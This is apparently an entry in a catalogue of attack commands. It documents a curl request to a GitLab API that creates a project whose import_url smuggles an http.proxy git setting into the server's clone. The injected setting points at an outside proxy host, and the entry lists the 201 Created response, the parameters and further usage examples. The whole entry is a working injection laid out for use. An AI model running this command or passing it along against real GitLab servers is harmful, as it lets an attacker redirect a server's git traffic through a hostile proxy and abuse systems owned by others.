---
id: cmd-uuid-001
data: >-
  curl -H "Authorization: Bearer $TOKEN" -v -XPOST
  'http://gitlab-vm.local/api/v4/projects?import_url=http://user@google.com/.proxy=http://proxy.aw.rs:8500&name=proxy4'
tags:
  - gitlab-api
  - injection
type: command
output: |-
  HTTP/1.1 201 Created
  {"id":204,...}
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.535Z'
verified: false
validated: true
submitted: true
---
# curl-create-project-with-injection

## Command

```bash
curl -H "Authorization: Bearer $TOKEN" -v -XPOST 'http://gitlab-vm.local/api/v4/projects?import_url=http://user@google.com/.proxy=http://proxy.aw.rs:8500&name=proxy4'
```

## Description

Creates a GitLab project via API with a malicious import_url that injects http.proxy config during the underlying git clone.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer $TOKEN"` | Auth header with API token | Yes |
| `-v` | Verbose output | No |
| `-XPOST` | POST method | Yes |
| `import_url=...` | Malicious URL for injection | Yes |
| `name=proxy4` | Project name | Yes |

## Examples

### Basic Usage

```bash
curl -H "Authorization: Bearer $TOKEN" -XPOST 'http://gitlab.example/api/v4/projects?import_url=http://example.com/.proxy=http://proxy:8500&name=test'
```

### Advanced Usage

Add more params like namespace_id if needed.

## Expected Output

JSON response with project details, ID 204, status 201.

## Related

- [[Related Procedure: Create-Project-with-Malicious-Import-URL]]
